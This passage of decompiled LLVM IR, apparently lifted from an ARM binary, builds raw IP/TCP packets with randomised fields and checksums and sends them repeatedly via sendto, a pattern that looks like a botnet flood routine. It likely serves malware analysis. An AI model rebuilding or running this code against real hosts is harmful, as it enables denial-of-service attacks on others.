  %v0_9e18 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e18 = trunc i32 %v0_9e18 to i16
  %v2_9e18 = load i32, i32* @r4, align 4
  %v3_9e18 = add i32 %v2_9e18, 2
  %v4_9e18 = inttoptr i32 %v3_9e18 to i16*
  store i16 %v1_9e18, i16* %v4_9e18, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_9e10, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_9d3c
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_9d3c, %bb79
  %v0_9e24 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e24 = trunc i32 %v0_9e24 to i8
  %v2_9e24 = load i32, i32* @r4, align 4
  %v3_9e24 = add i32 %v2_9e24, 8
  %v4_9e24 = inttoptr i32 %v3_9e24 to i8*
  store i8 %v1_9e24, i8* %v4_9e24, align 1
  %v0_9e28 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e28 = trunc i32 %v0_9e28 to i8
  %v2_9e28 = load i32, i32* @r4, align 4
  %v3_9e28 = add i32 %v2_9e28, 9
  %v4_9e28 = inttoptr i32 %v3_9e28 to i8*
  store i8 %v1_9e28, i8* %v4_9e28, align 1
  %v0_9e2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9e2c, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_9e2c = load i32, i32* %r2.global-to-local, align 4
  %v2_9e2c = trunc i32 %v1_9e2c to i16
  %v3_9e2c = load i32, i32* @r4, align 4
  %v4_9e2c = add i32 %v3_9e2c, 6
  %v5_9e2c = inttoptr i32 %v4_9e2c to i16*
  store i16 %v2_9e2c, i16* %v5_9e2c, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_2472c.58 to i32), i32* %r2.global-to-local, align 4
  %v2_9e34 = load i32, i32* @global_var_2472c.58, align 4
  store i32 %v2_9e34, i32* %r1.global-to-local, align 4
  %v1_9e38 = load i32, i32* @r4, align 4
  %v2_9e38 = add i32 %v1_9e38, 12
  %v3_9e38 = inttoptr i32 %v2_9e38 to i32*
  store i32 %v2_9e34, i32* %v3_9e38, align 4
  %v3_9e3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9e3c, i32* %r3.global-to-local, align 4
  store i32 %v2_9918, i32* %ip.global-to-local, align 4
  %v4_9e44 = mul i32 %v3_9e3c, 16
  %v5_9e44 = add i32 %v4_9e44, %v2_9918
  %v6_9e44 = inttoptr i32 %v5_9e44 to i32*
  %v7_9e44 = load i32, i32* %v6_9e44, align 4
  store i32 %v7_9e44, i32* %r2.global-to-local, align 4
  store i32 %v5_9e44, i32* %r3.global-to-local, align 4
  %v1_9e50 = load i32, i32* @r4, align 4
  %v2_9e50 = add i32 %v1_9e50, 16
  %v3_9e50 = inttoptr i32 %v2_9e50 to i32*
  store i32 %v7_9e44, i32* %v3_9e50, align 4
  %v0_9e54 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e54 = add i32 %v0_9e54, 12
  %v2_9e54 = inttoptr i32 %v1_9e54 to i16*
  %v3_9e54 = load i16, i16* %v2_9e54, align 2
  %v4_9e54 = zext i16 %v3_9e54 to i32
  store i32 %v4_9e54, i32* %r0.global-to-local, align 4
  %v1_9e58 = add i32 %v0_9e54, 8
  %v2_9e58 = inttoptr i32 %v1_9e58 to i32*
  %v3_9e58 = load i32, i32* %v2_9e58, align 4
  store i32 %v3_9e58, i32* %r1.global-to-local, align 4
  %v2_9e5c = load i32, i32* @r4, align 4
  %v3_9e5c = add i32 %v2_9e5c, 20
  %v4_9e5c = inttoptr i32 %v3_9e5c to i16*
  store i16 %v3_9e54, i16* %v4_9e5c, align 2
  %v0_9e60 = load i32, i32* @r4, align 4
  %v1_9e60 = add i32 %v0_9e60, 20
  store i32 %v1_9e60, i32* @r8, align 4
  %v1_9e64 = add i32 %v0_9e60, 33
  %v2_9e64 = inttoptr i32 %v1_9e64 to i8*
  %v3_9e64 = load i8, i8* %v2_9e64, align 1
  %v4_9e64 = zext i8 %v3_9e64 to i32
  store i32 %v4_9e64, i32* %r2.global-to-local, align 4
  %v0_9e68 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e68 = add i32 %v0_9e60, 24
  %v3_9e68 = inttoptr i32 %v2_9e68 to i32*
  store i32 %v0_9e68, i32* %v3_9e68, align 4
  %v0_9e6c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e6c = or i32 %v0_9e6c, 1
  store i32 %v1_9e6c, i32* %r2.global-to-local, align 4
  %v0_9e70 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e70 = add i32 %v0_9e70, 4
  %v2_9e70 = inttoptr i32 %v1_9e70 to i32*
  %v3_9e70 = load i32, i32* %v2_9e70, align 4
  store i32 %v3_9e70, i32* %r1.global-to-local, align 4
  %v1_9e74 = add i32 %v0_9e70, 14
  %v2_9e74 = inttoptr i32 %v1_9e74 to i16*
  %v3_9e74 = load i16, i16* %v2_9e74, align 2
  %v4_9e74 = zext i16 %v3_9e74 to i32
  store i32 %v4_9e74, i32* %r3.global-to-local, align 4
  %v1_9e78 = trunc i32 %v1_9e6c to i8
  %v2_9e78 = load i32, i32* @r8, align 4
  %v3_9e78 = add i32 %v2_9e78, 13
  %v4_9e78 = inttoptr i32 %v3_9e78 to i8*
  store i8 %v1_9e78, i8* %v4_9e78, align 1
  %v0_9e7c = load i32, i32* %r3.global-to-local, align 4
  %v1_9e7c = trunc i32 %v0_9e7c to i16
  %v2_9e7c = load i32, i32* @r8, align 4
  %v3_9e7c = add i32 %v2_9e7c, 2
  %v4_9e7c = inttoptr i32 %v3_9e7c to i16*
  store i16 %v1_9e7c, i16* %v4_9e7c, align 2
  %v0_9e80 = load i32, i32* @r8, align 4
  %v1_9e80 = add i32 %v0_9e80, 12
  %v2_9e80 = inttoptr i32 %v1_9e80 to i8*
  %v3_9e80 = load i8, i8* %v2_9e80, align 1
  %v4_9e80 = zext i8 %v3_9e80 to i32
  store i32 %v4_9e80, i32* %r3.global-to-local, align 4
  %v1_9e84 = add i32 %v0_9e80, 13
  %v2_9e84 = inttoptr i32 %v1_9e84 to i8*
  %v3_9e84 = load i8, i8* %v2_9e84, align 1
  %v4_9e84 = zext i8 %v3_9e84 to i32
  %tmp104 = urem i8 %v3_9e80, 16
  %v1_9e88 = zext i8 %tmp104 to i32
  %v1_9e8c = or i32 %v1_9e88, 128
  store i32 %v1_9e8c, i32* %r3.global-to-local, align 4
  %v1_9e90 = or i32 %v4_9e84, 16
  store i32 %v1_9e90, i32* %r2.global-to-local, align 4
  %v0_9e94 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e94 = add i32 %v0_9e80, 8
  %v3_9e94 = inttoptr i32 %v2_9e94 to i32*
  store i32 %v0_9e94, i32* %v3_9e94, align 4
  %v0_9e98 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e98 = trunc i32 %v0_9e98 to i8
  %v2_9e98 = load i32, i32* @r8, align 4
  %v3_9e98 = add i32 %v2_9e98, 12
  %v4_9e98 = inttoptr i32 %v3_9e98 to i8*
  store i8 %v1_9e98, i8* %v4_9e98, align 1
  %v0_9e9c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e9c = trunc i32 %v0_9e9c to i8
  %v2_9e9c = load i32, i32* @r8, align 4
  %v3_9e9c = add i32 %v2_9e9c, 13
  %v4_9e9c = inttoptr i32 %v3_9e9c to i8*
  store i8 %v1_9e9c, i8* %v4_9e9c, align 1
  %v0_9ea0 = call i32 @rand_next()
  %v1_9ea0 = trunc i32 %v0_9ea0 to i16
  store i32 %v0_9ea0, i32* %r0.global-to-local, align 4
  store i32 %v1_99e4, i32* %r1.global-to-local, align 4
  %v0_9ea8 = load i32, i32* @r8, align 4
  %v1_9ea8 = add i32 %v0_9ea8, 13
  %v2_9ea8 = inttoptr i32 %v1_9ea8 to i8*
  %v3_9ea8 = load i8, i8* %v2_9ea8, align 1
  %v4_9ea8 = zext i8 %v3_9ea8 to i32
  store i32 %v1_9eac, i32* %r2.global-to-local, align 4
  %v1_9eb0 = and i32 %v4_9ea8, 223
  %v5_9eb4 = or i32 %v1_9eb0, %v4_9eb4
  store i32 %v5_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = trunc i32 %v5_9eb4 to i8
  store i8 %v1_9eb8, i8* %v2_9ea8, align 1
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9ec0 = load i32, i32* @r8, align 4
  %v1_9ec0 = add i32 %v0_9ec0, 13
  %v2_9ec0 = inttoptr i32 %v1_9ec0 to i8*
  %v3_9ec0 = load i8, i8* %v2_9ec0, align 1
  %v4_9ec0 = zext i8 %v3_9ec0 to i32
  store i32 %v1_9ec4, i32* %r3.global-to-local, align 4
  %v1_9ec8 = and i32 %v4_9ec0, 239
  %v5_9ecc = or i32 %v1_9ec8, %v4_9ecc
  store i32 %v5_9ecc, i32* %r2.global-to-local, align 4
  %v1_9ed0 = trunc i32 %v5_9ecc to i8
  store i8 %v1_9ed0, i8* %v2_9ec0, align 1
  store i32 %v1_9a24, i32* %r1.global-to-local, align 4
  %v0_9ed8 = load i32, i32* @r8, align 4
  %v1_9ed8 = add i32 %v0_9ed8, 13
  %v2_9ed8 = inttoptr i32 %v1_9ed8 to i8*
  %v3_9ed8 = load i8, i8* %v2_9ed8, align 1
  %v4_9ed8 = zext i8 %v3_9ed8 to i32
  store i32 %v1_9edc, i32* %r2.global-to-local, align 4
  %v1_9ee0 = and i32 %v4_9ed8, 247
  %v5_9ee4 = or i32 %v1_9ee0, %v4_9ee4
  store i32 %v5_9ee4, i32* %r3.global-to-local, align 4
  %v1_9ee8 = trunc i32 %v5_9ee4 to i8
  store i8 %v1_9ee8, i8* %v2_9ed8, align 1
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9ef0 = load i32, i32* @r8, align 4
  %v1_9ef0 = add i32 %v0_9ef0, 13
  %v2_9ef0 = inttoptr i32 %v1_9ef0 to i8*
  %v3_9ef0 = load i8, i8* %v2_9ef0, align 1
  %v4_9ef0 = zext i8 %v3_9ef0 to i32
  store i32 %v1_9ef4, i32* %r3.global-to-local, align 4
  %v1_9ef8 = and i32 %v4_9ef0, 251
  %v5_9efc = or i32 %v1_9ef8, %v4_9efc
  store i32 %v5_9efc, i32* %r2.global-to-local, align 4
  %v1_9f00 = trunc i32 %v5_9efc to i8
  store i8 %v1_9f00, i8* %v2_9ef0, align 1
  store i32 %v1_9a64, i32* %r1.global-to-local, align 4
  %v0_9f08 = load i32, i32* @r8, align 4
  %v1_9f08 = add i32 %v0_9f08, 13
  %v2_9f08 = inttoptr i32 %v1_9f08 to i8*
  %v3_9f08 = load i8, i8* %v2_9f08, align 1
  %v4_9f08 = zext i8 %v3_9f08 to i32
  store i32 %v1_9f0c, i32* %r2.global-to-local, align 4
  %v1_9f10 = and i32 %v4_9f08, 253
  %v4_9f14 = or i32 %v1_9f10, %v3_9f14
  store i32 %v4_9f14, i32* %r3.global-to-local, align 4
  %v1_9f18 = trunc i32 %v4_9f14 to i8
  store i8 %v1_9f18, i8* %v2_9f08, align 1
  store i32 %v1_9a84, i32* %ip.global-to-local, align 4
  %v0_9f20 = load i32, i32* @r8, align 4
  %v1_9f20 = add i32 %v0_9f20, 13
  %v2_9f20 = inttoptr i32 %v1_9f20 to i8*
  %v3_9f20 = load i8, i8* %v2_9f20, align 1
  %v4_9f20 = zext i8 %v3_9f20 to i32
  %v1_9f28 = and i32 %v4_9f20, 254
  store i32 %v1_9f28, i32* %r2.global-to-local, align 4
  %v2_9f2c = or i32 %v1_9f28, %v1_9f24
  store i32 %v2_9f2c, i32* %r3.global-to-local, align 4
  %v1_9f30 = trunc i32 %v2_9f2c to i8
  store i8 %v1_9f30, i8* %v2_9f20, align 1
  %v3_9f34 = load i32, i32* @r8, align 4
  %v4_9f34 = add i32 %v3_9f34, 14
  %v5_9f34 = inttoptr i32 %v4_9f34 to i16*
  store i16 %v1_9ea0, i16* %v5_9f34, align 2
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r4, align 4
  %v1_9f3c = add i32 %v0_9f3c, 40
  store i32 %v1_9f3c, i32* %r0.global-to-local, align 4
  %v2_9f40 = inttoptr i32 %v1_9f3c to i16*
  %v3_9f40 = call i32 @rand_str(i16* %v2_9f40, i32 %v6_9a9c)
  store i32 %v3_9f40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c94

dec_label_pc_9f48:                                ; preds = %dec_label_pc_9b08
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_9a9c, 40
  br label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9ca8, %dec_label_pc_9f48
  %storemerge6.pre-phi = phi i32 [ %v1_9d98, %dec_label_pc_9ca8 ], [ %.pre, %dec_label_pc_9f48 ]
  %v0_9f6c26 = phi i32 [ %v1_9c9c, %dec_label_pc_9ca8 ], [ 0, %dec_label_pc_9f48 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_9a9c, 65536
  %storemerge = add i32 %v6_9a9c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_9f58 = add i32 %storemerge4, 1310720
  store i32 %v1_9f58, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_9f58, 256
  %v3_9f60 = and i32 %tmp83, 65280
  store i32 %v3_9f60, i32* %r3.global-to-local, align 4
  %v4_9f64 = udiv i32 %v1_9f58, 16777216
  %v5_9f64 = or i32 %v3_9f60, %v4_9f64
  store i32 %v5_9f64, i32* @r8, align 4
  %v2_a090 = icmp eq i32 %v1_9abc, 0
  br label %dec_label_pc_9f68

dec_label_pc_9f68:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074, %dec_label_pc_9f58
  %v0_9f6c = phi i32 [ %v0_9f6c26, %dec_label_pc_9f58 ], [ 0, %dec_label_pc_a074 ], [ 0, %dec_label_pc_9f68 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9f6c = icmp eq i32 %v0_9f6c, 0
  store i1 %v2_9f6c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9f6c, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_9f78:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f7c

dec_label_pc_9f7c:                                ; preds = %dec_label_pc_9fa4, %dec_label_pc_9f78
  %v1_9f84 = phi i32 [ %v1_a064, %dec_label_pc_9fa4 ], [ 0, %dec_label_pc_9f78 ]
  store i32 %v2_9928, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_9f84 = mul i32 %v1_9f84, 4
  %v5_9f84 = add i32 %v4_9f84, %v2_9928
  %v6_9f84 = inttoptr i32 %v5_9f84 to i32*
  %v7_9f84 = load i32, i32* %v6_9f84, align 4
  store i32 %v7_9f84, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9f8c = load i32, i32* @fp, align 4
  %v9_9f8c = icmp eq i32 %v0_9f8c, 65535
  store i1 %v9_9f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_9f90 = add i32 %v7_9f84, 20
  store i32 %v1_9f90, i32* @r5, align 4
  br i1 %v9_9f8c, label %dec_label_pc_a088, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f7c
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a09c

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f98, %dec_label_pc_a088, %dec_label_pc_a09c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9fa8 = load i32, i32* @r4, align 4
  %v3_9fa8 = add i32 %v2_9fa8, 10
  %v4_9fa8 = inttoptr i32 %v3_9fa8 to i16*
  store i16 0, i16* %v4_9fa8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9fb0 = load i32, i32* @r4, align 4
  store i32 %v0_9fb0, i32* @r0, align 4
  %v2_9fb4 = call i32 @checksum_generic(i32 %v0_9fb0, i32 20)
  %v3_9fb4 = trunc i32 %v2_9fb4 to i16
  store i32 %v2_9fb4, i32* %r0.global-to-local, align 4
  %v3_9fb8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_9918, i32* %r2.global-to-local, align 4
  %v3_9fc0 = mul i32 %v3_9fb8, 16
  %v2_9fc4 = add i32 %v3_9fc0, %v2_9918
  store i32 %v2_9fc4, i32* %r1.global-to-local, align 4
  %v1_9fc8 = add i32 %v2_9fc4, 4
  %v2_9fc8 = inttoptr i32 %v1_9fc8 to i32*
  %v3_9fc8 = load i32, i32* %v2_9fc8, align 4
  %v3_9fcc = mul i32 %v3_9fc8, 65536
  store i32 %v3_9fcc, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_9fc8, 256
  %v1_9fd4 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_9fc8, 256
  %v4_9fd8 = urem i32 %tmp86, 256
  %v5_9fd8 = or i32 %v4_9fd8, %v1_9fd4
  store i32 %v5_9fd8, i32* %r3.global-to-local, align 4
  %v1_9fdc = add i32 %v3_9fc8, 1
  store i32 %v1_9fdc, i32* %r2.global-to-local, align 4
  store i32 %v1_9fdc, i32* %v2_9fc8, align 4
  %v0_9fe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9fe4 = load i32, i32* @r5, align 4
  %v2_9fe4 = add i32 %v1_9fe4, 4
  %v3_9fe4 = inttoptr i32 %v2_9fe4 to i32*
  store i32 %v0_9fe4, i32* %v3_9fe4, align 4
  %v0_9fe8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9fe8 = add i32 %v0_9fe8, 8
  %v2_9fe8 = inttoptr i32 %v1_9fe8 to i32*
  %v3_9fe8 = load i32, i32* %v2_9fe8, align 4
  %tmp87 = mul i32 %v3_9fe8, 256
  %v1_9ff4 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_9fe8, 256
  %v4_9ff8 = urem i32 %tmp88, 256
  %v5_9ff8 = or i32 %v4_9ff8, %v1_9ff4
  %v1_9ffc = load i32, i32* @r5, align 4
  %v2_9ffc = add i32 %v1_9ffc, 8
  %v3_9ffc = inttoptr i32 %v2_9ffc to i32*
  store i32 %v5_9ff8, i32* %v3_9ffc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a004 = load i32, i32* @r4, align 4
  %v4_a004 = add i32 %v3_a004, 10
  %v5_a004 = inttoptr i32 %v4_a004 to i16*
  store i16 %v3_9fb4, i16* %v5_a004, align 2
  %v0_a008 = load i32, i32* @r5, align 4
  store i32 %v0_a008, i32* @r1, align 4
  %v0_a00c = load i32, i32* %r3.global-to-local, align 4
  %v1_a00c = trunc i32 %v0_a00c to i16
  %v3_a00c = add i32 %v0_a008, 16
  %v4_a00c = inttoptr i32 %v3_a00c to i16*
  store i16 %v1_a00c, i16* %v4_a00c, align 2
  %v0_a010 = load i32, i32* @r8, align 4
  store i32 %v0_a010, i32* %r2.global-to-local, align 4
  %v0_a014 = load i32, i32* @sl, align 4
  store i32 %v0_a014, i32* %r3.global-to-local, align 4
  %v0_a018 = load i32, i32* @r4, align 4
  store i32 %v0_a018, i32* %r0.global-to-local, align 4
  %v4_a01c = call i32 @checksum_tcpudp(i32 %v0_a018, i32 %v0_a008, i32 %v0_a010, i32 %v0_a014)
  %v5_a01c = trunc i32 %v4_a01c to i16
  store i32 %v4_a01c, i32* %r0.global-to-local, align 4
  %v3_a020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a020, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a028 = mul i32 %v3_a020, 32
  store i32 %v3_a028, i32* %lr.global-to-local, align 4
  %v3_a02c = load i32, i32* @r5, align 4
  %v4_a02c = add i32 %v3_a02c, 16
  %v5_a02c = inttoptr i32 %v4_a02c to i16*
  store i16 %v5_a01c, i16* %v5_a02c, align 2
  %v0_a030 = load i32, i32* %lr.global-to-local, align 4
  %v1_a030 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_a030, -8
  %v5_a030 = add i32 %v0_a030, %tmp105
  store i32 %v5_a030, i32* %lr.global-to-local, align 4
  %v0_a034 = load i32, i32* @r5, align 4
  %v1_a034 = add i32 %v0_a034, 2
  %v2_a034 = inttoptr i32 %v1_a034 to i16*
  %v3_a034 = load i16, i16* %v2_a034, align 2
  %v4_a034 = zext i16 %v3_a034 to i32
  store i32 %v4_a034, i32* @r5, align 4
  %v1_a038 = load i32, i32* %ip.global-to-local, align 4
  %v2_a038 = add i32 %v1_a038, %v5_a030
  store i32 %v2_a038, i32* @lr, align 4
  %v3_a03c = add i32 %v2_a038, 2
  %v4_a03c = inttoptr i32 %v3_a03c to i16*
  store i16 %v3_a034, i16* %v4_a03c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a048 = load i32, i32* @r4, align 4
  store i32 %v0_a048, i32* %r1.global-to-local, align 4
  %v0_a04c = load i32, i32* @sb, align 4
  store i32 %v0_a04c, i32* %r0.global-to-local, align 4
  %v0_a050 = load i32, i32* @r7, align 4
  store i32 %v0_a050, i32* %r2.global-to-local, align 4
  %v0_a054 = load i32, i32* @lr, align 4
  %v6_a05c = call i32 @__libc_sendto(i32 %v0_a04c, i32 %v0_a048, i32 %v0_a050, i32 16384, i32 %v0_a054, i32 16)
  %v3_a060 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a060, i32* %r3.global-to-local, align 4
  %v1_a064 = add i32 %v3_a060, 1
  store i32 %v1_a064, i32* %r0.global-to-local, align 4
  %v0_a068 = load i32, i32* @r6, align 4
  %v9_a068 = icmp eq i32 %v0_a068, %v1_a064
  store i1 %v9_a068, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a064, i32* %stack_var_-44, align 4
  %v8_a070 = icmp sgt i32 %v0_a068, %v1_a064
  br i1 %v8_a070, label %dec_label_pc_9f7c, label %dec_label_pc_a074

dec_label_pc_a074:                                ; preds = %dec_label_pc_9fa4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a078 = icmp eq i32 %v0_a068, 0
  store i1 %v2_a078, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a078, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_a088:                                ; preds = %dec_label_pc_9f7c
  %v0_a088 = call i32 @rand_next()
  %v1_a088 = trunc i32 %v0_a088 to i16
  store i32 %v0_a088, i32* %r0.global-to-local, align 4
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  %v3_a094 = load i32, i32* @r4, align 4
  %v4_a094 = add i32 %v3_a094, 4
  %v5_a094 = inttoptr i32 %v4_a094 to i16*
  store i16 %v1_a088, i16* %v5_a094, align 2
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a088.dec_label_pc_a09c_crit_edge

dec_label_pc_a088.dec_label_pc_a09c_crit_edge:    ; preds = %dec_label_pc_a088
  %v0_a09c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a09c

dec_label_pc_a09c:                                ; preds = %dec_label_pc_a088.dec_label_pc_a09c_crit_edge, %dec_label_pc_9f98
  %v0_a09c = phi i32 [ %v0_a09c.pre, %dec_label_pc_a088.dec_label_pc_a09c_crit_edge ], [ %v7_9f84, %dec_label_pc_9f98 ]
  %v1_a09c = add i32 %v0_a09c, 40
  store i32 %v1_a09c, i32* %r0.global-to-local, align 4
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v2_a0a4 = inttoptr i32 %v1_a09c to i16*
  %v3_a0a4 = call i32 @rand_str(i16* %v2_a0a4, i32 %v6_9a9c)
  store i32 %v3_a0a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9fa4

; uselistorder directives
  uselistorder i32 %v0_a088, { 1, 0 }
  uselistorder i32 %v1_a064, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a030, { 1, 0 }
  uselistorder i32 %v4_a01c, { 1, 0 }
  uselistorder i32 %v3_9fe8, { 1, 0 }
  uselistorder i32 %v3_9fc8, { 3, 2, 0, 1 }
  uselistorder i32 %v2_9fb4, { 1, 0 }
  uselistorder i1 %v2_a090, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9ea0, { 1, 0 }
  uselistorder i32 %v0_9dd8, { 1, 0 }
  uselistorder i32 %v5_9d6c, { 1, 0 }
  uselistorder i32 %v0_9d2c, { 1, 0 }
  uselistorder i32 %v0_9ce8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9c98, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9c84, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9c10, { 1, 0 }
  uselistorder i32 %v6_9c08, { 0, 2, 1, 3 }
  uselistorder i1 %v9_9c38, { 1, 0 }
  uselistorder i32 %v4_9c4c, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_9b94, { 1, 0, 2 }
  uselistorder i32 %v0_9d44, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_9b84, { 1, 0 }
  uselistorder i1 %v7_9b7c, { 1, 0, 2 }
  uselistorder i1 %v7_9b30, { 1, 0 }
  uselistorder i32 %v3_9b2c, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_9f0c, { 1, 0 }
  uselistorder i32 %v1_9ef4, { 1, 0 }
  uselistorder i32 %v1_9edc, { 1, 0 }
  uselistorder i32 %v1_9ec4, { 1, 0 }
  uselistorder i32 %v1_9eac, { 1, 0 }
  uselistorder i32 %v3_9c44, { 1, 0 }
  uselistorder i1 %v2_9c60, { 1, 0 }
  uselistorder i32 %v1_9c5c, { 1, 0 }
  uselistorder i32 %v4_9c58, { 2, 0, 1 }
  uselistorder i32 %v2_9b6c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_9b08, { 1, 0 }
  uselistorder i1 %v7_9b00, { 1, 0 }
  uselistorder i1 %v7_9ad4, { 1, 0 }
  uselistorder i32 %v3_9ad0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_9abc, { 2, 3, 1, 0 }
  uselistorder i32 %v6_9a9c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_9a84, { 1, 2, 0 }
  uselistorder i32 %v1_9a64, { 1, 2, 0 }
  uselistorder i32 %v1_9a44, { 1, 2, 0 }
  uselistorder i32 %v1_9a24, { 1, 2, 0 }
  uselistorder i32 %v1_9a04, { 1, 2, 0 }
  uselistorder i32 %v1_99e4, { 1, 2, 0 }
  uselistorder i32 %v6_99c0, { 1, 0 }
  uselistorder i32 %v1_99a8, { 1, 2, 0 }
  uselistorder i32 %v6_9940, { 2, 1, 3, 0 }
  uselistorder i32 %v2_9928, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_9918, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
